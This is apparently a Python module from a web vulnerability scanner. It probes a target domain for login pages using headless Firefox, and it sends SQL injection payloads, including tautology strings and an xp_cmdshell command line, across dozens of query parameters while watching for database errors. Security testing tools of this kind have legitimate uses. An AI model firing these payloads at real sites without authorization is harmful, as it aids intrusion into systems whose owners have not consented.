from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style
import platform
import requests
import os

fg = Fore.GREEN
fr = Fore.RED
fw = Fore.WHITE
fy = Fore.YELLOW
fo = Fore.LIGHTYELLOW_EX
flc = Fore.CYAN
bd = Style.BRIGHT
res = Style.RESET_ALL


def check_session_management(domain):
    os_type = platform.system()
    if os_type == "Windows":
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver.exe')
    elif os_type == "Linux":
        geckodriver_path = os.path.join(os.path.dirname(__file__), 'geckodriver')
    else:
        raise Exception(f"Unsupported OS: {os_type}")

    service = FirefoxService(executable_path=geckodriver_path)
    options = Options()
    options.headless = True

    login_paths = [
        "login",
        "wp-login.php",
        "admin",
        "user/login",
        "signin"
    ]

    try:
        driver = webdriver.Firefox(service=service, options=options)
        wait = WebDriverWait(driver, 10)

        login_pages = []
        for path in login_paths:
            full_url = f"{domain}/{path}"
            response = requests.get(full_url, verify=False)
            if response.status_code == 200:
                driver.get(full_url)
                if "login" in driver.title.lower() or "sign in" in driver.title.lower() or "anmelden" in driver.title.lower() or "einloggen" in driver.title.lower():
                    login_pages.append(full_url)
                    print(f"{fg}[+] Login page found at: {full_url}{fw}")

        if not login_pages:
            print(f"{fy}[-] No login pages found.{fw}")
    except Exception as e:
        print(f"{fr}[-] Error checking session management: {e}{fw}")
    finally:
        driver.quit()


def check_sql_injection(domain):
    injection_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' ({",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "'; EXEC xp_cmdshell('ping 127.0.0.1') --"
    ]

    query_params = [
        "id", "name", "search", "q", "query", "item", "category", "product",
        "page", "user", "username", "email", "login", "pass", "password",
        "type", "sort", "order", "filter", "view", "action", "cmd", "command",
        "module", "path", "file", "filename", "dir", "directory", "folder",
        "content", "data", "date", "time", "year", "month", "day", "event",
        "title", "description", "comment", "message", "post", "article",
        "news", "blog", "forum", "thread", "topic", "board", "section",
        "chapter", "pageid", "postid", "threadid", "articleid", "newsid",
        "blogid", "forumid", "topicid", "boardid", "sectionid", "chapterid"
    ]
    vulnerable = False

    for payload in injection_payloads:
        for param in query_params:
            try:
                response = requests.get(f"{domain}/?{param}={payload}", timeout=10)
                if any(error in response.text.lower() for error in ["sql syntax", "mysql", "syntax error", "sql error", "database error", "invalid query"]):
                    print(f"{fr}{bd}[-] Possible SQL injection vulnerability detected with payload: {payload} on parameter: {param}{res}")
                    vulnerable = True
            except requests.RequestException as e:
                print(f"{fr}{bd}[-] Error testing payload {payload} on parameter {param}: {e}{res}")

    if not vulnerable:
        print(f"{fg}{bd}[+] No SQL injection vulnerabilities detected.{res}")
